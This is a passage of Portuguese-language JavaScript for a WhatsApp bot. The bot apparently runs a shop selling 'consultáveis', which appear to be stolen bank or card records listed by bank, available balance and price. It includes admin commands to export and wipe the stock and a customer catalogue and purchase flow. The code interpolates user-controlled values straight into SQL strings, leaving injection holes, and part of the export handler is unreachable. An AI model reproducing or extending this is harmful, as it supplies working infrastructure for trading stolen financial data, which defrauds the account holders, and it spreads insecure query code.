                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {

                Texto = `Comando inválido! CODE:${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/baixarestoqueconsultavel") > -1 && Adms.includes(Numero)) {
            Texto = `Gerando arquivo...`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM CONSULTAVEIS`).all();
            //shuffle(Array_MATERIAL);

            today = new Date();
            today.setHours(today.getHours() + 0);
            Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Consultaveis Data ${today}.txt`
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

            Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_MATERIAL.length; index++) {
                console.log(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["SALDO"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}`)
                message.write(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["SALDO"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}\n`);
                if (index === parseInt(Array_MATERIAL.length) - 1) {
                    //console.log("Foi")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/deletarestoqueconsultavel" && Adms.includes(Numero)) {
            await DataBase_Better.prepare(`DELETE FROM CONSULTAVEIS`).run();
            Texto = `*ESTOQUE DE CONSULTÁVEIS DELETADO COM SUCESSO!*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenuconsultavel===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                TEXTO_MENU_CONSUL = msg[1]
                TEXTO_MENU_CONSUL = TEXTO_MENU_CONSUL.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_CONSUL}' WHERE PARAMETRO = 'TEXTO_MENU_CONSUL'`).run()

                Texto = `*TEXTO DO MENU DE CONSULTÁVEIS ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                return
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textocomprouconsultavel===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                MENSAGEM_AO_COMPRAR_CONSULTAVEL = msg[1]
                MENSAGEM_AO_COMPRAR_CONSULTAVEL = MENSAGEM_AO_COMPRAR_CONSULTAVEL.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_CONSULTAVEL}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CONSULTAVEL'`).run()

                Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR CONSULTÀVEL, ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "catalogo_consutaveis") {
            iD_Footer = Date.now()

            Categorias = await DataBase_Better.prepare(`SELECT * FROM CONSULTAVEIS`).all();
            if (Categorias.length === 0) {

                Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de consultáveis, mas o estoque está vazio!`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            TEXTO_MENU_CONSUL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_CONSUL'`).get()["VALOR"]
            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

            Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,BANCO,SALDO,PRECO FROM CONSULTAVEIS`).all();

            CONSTRUCAO_LISTMESSAGE_buttonText = `CATÁLOGO CONSULTÁVEIS`
            CONSTRUCAO_LISTMESSAGE_title = "Selecione a consul e clique no botão enviar para comprar."
            CONSTRUCAO_LISTMESSAGE_description = `Clique em *OPÇÕES* para escolher a Consultável desejada.

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_CONSUL}

◆ ━━━━❪✪❫━━━━ ◆
⚠️*MUITA ATENÇÃO AO ESCOLHER A CONSULTÁVEL DESEJADA!*⚠️`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows = []
            for await (item of Array_CCs) {
                ID = item["rowid"]
                BANCO = item["BANCO"]
                SALDO = item["SALDO"]
                PRECO = item["PRECO"]

                CONSTRUCAO_LISTMESSAGE_rows.push({
                    rowId: `${iD_Footer.toString()}|id_consultavel_sera_comprada|${ID}`,
                    title: `R$:${SALDO} Disponível`,
                    description: `💰PREÇO: R$:${PRECO}
🏦${BANCO}
ID: ${ID}
`
                })
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "id_consultavel_sera_comprada") {

            ID = Mensagem_ID_Lista_Array_Partes[2]

            ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM CONSULTAVEIS WHERE _rowid_ = '${ID}'`).get()
            if (ROWID === undefined) {
                Texto = `Desculpe, outra pessoa comprou esta consultável, escolha outra!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            item = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CONSULTAVEIS WHERE _rowid_ = '${ID}'`).get();

            ID = item["rowid"]
            BANCO = item["BANCO"]
            SALDO = item["SALDO"]
            PRECO = item["PRECO"]
            INFORMACOES_ADICIONAIS = item["INFORMACOES_ADICIONAIS"]

            PRECO_MATERIAL = parseFloat(PRECO).toFixed(2)

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
            if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_MATERIAL)) {

                Texto = `⚠️*Você não possui saldo suficiente para comprar esta Consultável.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

